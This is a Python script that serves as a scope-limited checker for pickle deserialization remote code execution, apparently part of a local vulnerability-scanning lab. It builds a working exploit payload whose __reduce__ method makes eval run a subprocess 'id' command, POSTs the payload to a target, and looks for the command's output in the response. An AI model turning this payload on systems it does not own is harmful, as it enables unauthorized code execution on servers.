"""
Minimal, LLM-free insecure-deserialization (pickle) RCE checker.

Like CSRF/IDOR, this doesn't fit auto_vuln_scanner.py's model (fuzz a GET
param with text payloads): the "payload" here is a crafted pickle byte
stream whose __reduce__ method runs an attacker-chosen callable during
unpickling -- this is remote code execution, not a parsing bug. The
check crafts that payload itself, POSTs it, and looks for the executed
command's own output coming back in the response (the same 'uid=' marker
auto_vuln_scanner.py's cmdi class uses), which is direct proof code ran
on the server, not just a guess.

Scope: run only against targets you own/control, e.g. vulnerable_app.py
in this same directory.
"""

from __future__ import annotations

import argparse
import base64
import pickle
import sys

import requests

from auto_vuln_scanner import _is_allowed_target


class _RCEPayload:
    """Pickling this object embeds an arbitrary-code callable in the
    byte stream; unpickling it (pickle.loads) runs that callable."""

    def __reduce__(self):
        return (eval, ("__import__('subprocess').check_output(['id']).decode()",))


def build_payload() -> bytes:
    return base64.b64encode(pickle.dumps(_RCEPayload()))


def check(url: str) -> tuple[bool, str]:
    resp = requests.post(url, data=build_payload(), timeout=10)
    if "uid=" in resp.text:
        return True, f"RCE confirmed, command output leaked via deserialization: {resp.text.strip()}"
    return False, f"deserialization did not execute attacker code (status {resp.status_code}): {resp.text.strip()}"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="e.g. http://127.0.0.1:5000/deserialize")
    parser.add_argument(
        "--i-own-this-target",
        action="store_true",
        help="override the localhost/RFC1918-only scope check",
    )
    args = parser.parse_args()

    if not args.i_own_this_target:
        allowed, reason = _is_allowed_target(args.url)
        if not allowed:
            print(f"Refusing to scan: {reason}", file=sys.stderr)
            return 2

    print(f"Target: {args.url}")
    print("-" * 60)

    vulnerable, detail = check(args.url)
    if vulnerable:
        print(f"VULNERABLE: {detail}")
        return 1

    print(f"Not vulnerable: {detail}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
